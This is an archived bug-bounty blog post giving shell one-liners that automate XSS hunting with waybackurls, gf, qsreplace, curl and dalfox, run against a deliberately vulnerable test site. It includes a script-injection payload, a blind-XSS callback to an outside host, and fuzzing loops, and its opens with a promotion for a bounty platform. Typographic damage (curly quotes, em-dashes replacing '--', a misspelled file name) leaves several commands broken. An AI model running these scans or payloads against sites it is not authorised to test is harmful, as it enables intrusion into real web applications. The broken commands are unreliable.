# XSS Tools

- **Source URL:** https://medium.com/@videopourtoujour/xss-tools-2a95e9f93786?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20230627032119/https://medium.com/@videopourtoujour/xss-tools-2a95e9f93786
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/3079 (id 3079)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# XSS Tools

2 min read6 days ago

--

Important Message : First Let Me introduce this bug bounty plateform that i found and im in love with it ,it called BugBeat (no saturated programes, no responce delay , +50 programes , etc….):


# Here is The Link : [https://bugbeat.tech](https://bugbeat.tech)

# Lets Get Started :)

## Automate XSS using Dalfox, WaybackURL, GF Patterns.

\<b> Make sure you have Go installed on your Machine \</b>


## ### To Install Go on your Machine:

```
1) sudo apt install -y golang
 2) export GOROOT=/usr/lib/go
 3) export GOPATH=$HOME/go
 4) export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
 5) source .bashrc
```
## ## How to Hunt Blind XSS using Dalfox?

```
- Use Waybackurls by Tomnomnom to Fetch URLS for Specific Target.
- Use GF patterns to find Possible XSS Vulnerable Parameters.
- Use Dalfox to find XSS.
```
Steps :

`waybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | dalfox -b blindxss.xss.ht pipe > output.txt`
\## How to Hunt Reflected XSS?

```
- Use Waybackurls by Tomnomnom to Fetch URLS for Specific Target.
- Use qsreplace for Accept URLs on stdin, replace all query string values with a user-supplied value, only output each combination of query string parameters once per host and path.* Steps :
```
````
waybackurls testphp.vulnweb.com| grep ‘=’ | qsreplace ‘“><script>alert(1)</script>’ | while read host do ; do curl -s — path-as-is — insecure “$host” | grep -qs “<script>alert(1)</script>” && echo “$host \033[0;31m” Vulnerable;done
```
## Find the parameters which are not filtering special characters — One Liner
```
echo “test.url” | waybackurls | grep “=” | tee waybackurls.txt
cat waybackruls | egrep -iv “.(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|pdf|svg|txt)” | qsreplace ‘“><()’| tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl — silent — path-as-is — insecure “$host” | grep -qs “\”><()” && echo -e “$host \033[91m Vullnerable \e[0m \n” || echo -e “$host \033[92m Not Vulnerable \e[0m \n”; done | tee XSS.txt
```
````
## ## Tools Download Links:-

```
1:- [Dalfox](https://github.com/hahwul/dalfox)
* 2:- [Waybackurls](https://github.com/tomnomnom/waybackurls)
* 3:- [GF](https://github.com/tomnomnom/gf)
* 4:- [GF Patterns](https://github.com/1ndianl33t/Gf-Patterns)
* 5:- [qsreplace](https://github.com/tomnomnom/qsreplace)
```
`Find Script here : [QuickXSS](https://github.com/theinfosecguy/QuickXSS)`
